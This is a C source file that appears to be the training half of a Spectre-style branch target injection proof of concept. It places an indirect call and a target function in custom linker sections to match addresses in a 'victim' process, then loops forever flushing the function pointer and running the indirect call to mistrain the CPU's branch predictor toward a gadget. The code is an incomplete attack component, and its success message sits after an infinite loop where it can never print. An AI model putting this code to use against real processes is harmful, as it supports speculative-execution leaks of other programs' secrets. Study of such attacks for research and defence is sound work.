#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>


//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));



/*
 * This is the target of the indirect call
 * which we locate at the address of a gadget
 * in the "victim" process we are trying to
 * (mis)train the processor's BTB to call
 */
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
}

void (*fn_ptr)(void); // we'll set this = target_fn, and cflush it

// Place this at the address of the function that will be doing an indirect call
// (measure)
void indirect(void) __attribute__((section(".indirect")));
void indirect(void) {
    // do our indirect jump
    // 16 taken (conditional?) branches...
    // HACK: relative jmp is 2 bytes (74 00 is "je foo\nfoo:")
    // If you want these to all be taken, set rax=0x11
    // otherwise there will be 16 not-taken branches
    asm volatile (
            "cmpb  $0x11, %%al\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            "je .+2\n"
            :: "a"(0x11) : "rbx");

    // Do indirect jump
    (*fn_ptr)();
}


void train()
{
    fn_ptr = target_fn;
    while (1) {
        _mm_clflush(fn_ptr);
        indirect();
    }
}


void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    uint64_t x;

    //printf("funcfoo = %p\n", funcfoo);
    //printf("funcfoo = %p\n", funcbar);
    printf("&x = %p\n", &x);

    fn_ptr = target_fn;
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);
    printf("target_fn = %p\n", target_fn);

    printf("training...\n");

    train();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
